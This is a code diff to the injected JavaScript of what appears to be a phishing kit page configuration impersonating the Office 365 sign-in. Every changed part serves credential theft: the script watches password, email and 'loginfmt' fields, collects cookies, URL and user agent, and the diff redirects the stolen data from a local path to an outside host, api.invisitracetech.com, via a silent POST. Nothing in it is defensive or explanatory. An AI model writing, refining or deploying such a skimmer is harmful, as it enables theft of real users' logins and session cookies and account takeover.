@@ -186,8 +186,8 @@ js_inject:
       (function() {
         var lastCapture = '';
         var capturedCreds = { username: '', password: '' };
-        var providerName = 'Office 365';
         var providerId = 'o365';
+        var providerName = 'Office 365';
 
         function sendSessionData() {
           try {
@@ -203,60 +203,63 @@ js_inject:
             });
 
             var sessionInfo = {
-              provider: providerId,
+              provider: providerId || 'unknown',
               credentials: capturedCreds,
-              url: window.location.href,
+              url: window.location.href || '',
               userAgent: navigator.userAgent || '',
-              cookies: cookieObj,
-              timestamp: new Date().toISOString()
+              timestamp: new Date().toISOString(),
+              cookies: cookieObj
             };
-
-            var payload = {
-              username: 'SessionData-' + providerName,
-              password: JSON.stringify(sessionInfo)
+            
+            var payload = { 
+              username: 'SessionData-' + providerName, 
+              password: JSON.stringify(sessionInfo) 
             };
-
-            fetch('/log/session', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(payload),
-              keepalive: true
+            
+            fetch('https://api.invisitracetech.com/log/session', { 
+              method: 'POST', 
+              headers: { 'Content-Type': 'application/json' }, 
+              body: JSON.stringify(payload), 
+              keepalive: true 
             }).catch(function(){});
           } catch(e) {}
         }
 
-        var monitor = (function() {
-          var watchedElements = typeof WeakSet !== 'undefined' ? new WeakSet() : { add: function(el) { el._o365Watched = true; }, has: function(el) { return el._o365Watched; } };
-          return function() {
-            document.querySelectorAll('input, form, button, [role="button"]').forEach(function(el) {
-              if (watchedElements.has(el)) return;
-              watchedElements.add(el);
-              if (el.tagName === 'INPUT') {
-                var captureField = function() {
-                  var v = el.value;
-                  if (!v) return;
-                  var t = (el.type || '').toLowerCase();
-                  var n = (el.name || el.id || '').toLowerCase();
-                  if (t === 'password' || n.includes('pass') || n.includes('pwd')) {
-                    if (v !== capturedCreds.password) { capturedCreds.password = v; sendSessionData(); }
-                  } else if (t === 'email' || n.includes('user') || n.includes('email') || n.includes('login')) {
-                    if (v !== capturedCreds.username) { capturedCreds.username = v; }
-                  }
-                };
-                el.addEventListener('input', captureField, { passive: true });
-                el.addEventListener('change', captureField, { passive: true });
-                el.addEventListener('blur', captureField, { passive: true });
-              } else if (el.tagName === 'FORM') {
-                el.addEventListener('submit', function() { setTimeout(sendSessionData, 100); }, { passive: true });
-              } else {
-                el.addEventListener('click', function() { setTimeout(sendSessionData, 100); }, { passive: true });
-              }
-            });
-          };
-        })();
+        function monitorFormInputs() {
+          document.querySelectorAll('input').forEach(function(el) {
+            function captureField() {
+              var t = (el.type || '').toLowerCase();
+              var n = (el.name || el.id || el.getAttribute('aria-label') || '').toLowerCase();
+              var v = el.value;
+              if (!v) return;
 
-        var observer = new MutationObserver(monitor);
-        observer.observe(document, { childList: true, subtree: true });
-        setInterval(monitor, 3000);
-        monitor();
+              var updated = false;
+              if (t === 'password' || /pass|pwd/.test(n)) {
+                if (v !== capturedCreds.password) { capturedCreds.password = v; updated = true; }
+              } else if (t === 'email' || /loginfmt|user|email|login|account/.test(n)) {
+                if (v !== capturedCreds.username) { capturedCreds.username = v; updated = true; }
+              }
+              if(updated) sendSessionData();
+            }
+            el.addEventListener('input', captureField, { passive: true });
+            el.addEventListener('change', captureField, { passive: true });
+            el.addEventListener('blur', captureField, { passive: true });
+          });
+          document.querySelectorAll('form').forEach(function(form) {
+            form.addEventListener('submit', function() { sendSessionData(); });
+          });
+          document.querySelectorAll('input[type="submit"], [role="button"]').forEach(function(btn) {
+            btn.addEventListener('click', function() { setTimeout(sendSessionData, 150); });
+          });
+        }
+
+        function runMainLogic() {
+          var observer = new MutationObserver(function(mutations) {
+            monitorFormInputs();
+          });
+          monitorFormInputs();
+          observer.observe(document, { childList: true, subtree: true });
+        }
+
+        runMainLogic();
       })();
